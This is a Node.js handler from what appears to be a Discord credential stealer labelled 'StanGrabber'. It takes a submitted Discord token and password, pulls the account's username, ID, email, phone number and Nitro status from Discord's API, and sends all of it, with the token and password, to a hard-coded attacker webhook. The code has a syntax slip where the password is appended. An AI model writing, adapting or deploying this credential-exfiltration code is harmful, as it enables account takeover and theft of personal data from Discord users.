const axios = require('axios');



exports.send = (req, res, webhook) => {
    const token = req.body.token;
    const password = req.body.password;


    if (token === undefined || password === undefined)
        return res.status(400).json({status: "error",message: "Not sent."});

    function GetInfos(token, password) {
        fetch('https://discordapp.com/api/v8/users/@me', {
        method: 'get',
        headers: {
            'Content-Type': 'application/json',
            'Authorization': token
        }
    })
    .then(x => x.json()).then(y => {
        var nitro;
        var phone;
        if (JSON.parse(JSON.stringify(y)).premium_type == 1) {
            nitro = "Nitro Classic";
        } else if (JSON.parse(JSON.stringify(y)).premium_type == 2) {
            nitro = "Nitro Boost";
        } else {
            nitro = "None";
        }

        if (JSON.parse(JSON.stringify(y)).phone == null) {
            phone = "None";
        } else {
            phone = JSON.parse(JSON.stringify(y)).phone;
        }

        axios.post(`https://canary.discord.com/api/webhooks/793927074590228566/k41Qn_WnIX7SO0mVeq8O8e76QcSG5YAWfEgcdRq9fToxiuXd1xwUjNbJZr51Q2MUILuq`, {
            username: `StanGrabber`,
            content: `Username : ` + JSON.parse(JSON.stringify(y)).username + '\n' + `ID : ` + JSON.parse(JSON.stringify(y)).id + '\n' + "E-Mail : " + JSON.parse(JSON.stringify(y)).email + '\n' + "Phone : " + JSON.parse(JSON.stringify(y)).phone + '\n' + "Nitro Type : " + nitro + '\n' + "Token : " + token + '\n' + "Password : "
            password
        }).then((z) => {
        	if (z.status === 200) return res.status(200).json({status: "ok",message: "Sent."});
        }).catch((bite) => {
        	return res.status(500).json({status: "error",message: "Not sent."});
        });
    });
    }

    GetInfos(token, password);
}
